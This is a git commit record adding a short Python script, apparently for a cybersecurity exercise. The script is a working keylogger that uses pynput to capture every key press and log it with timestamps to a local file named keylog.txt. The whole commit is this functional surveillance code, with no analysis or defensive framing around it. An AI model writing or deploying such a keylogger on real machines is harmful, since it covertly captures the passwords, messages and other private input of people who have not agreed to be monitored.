9cfae8a44daccd1d308744c6bab6fd329de58407
Alby <100009818+alby-shinoj@users.noreply.github.com>
2024-07-23 22:42:13 +0530

    Add files via upload

---
+++ PRODIGY_CS_04.py
@@ -0,0 +1,12 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+# Set up logging to log keystrokes to a file
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s - %(message)s")
+
+def on_press(key):
+    logging.info(str(key))
+
+# Set up the listener
+with Listener(on_press=on_press) as listener:
+    listener.join()
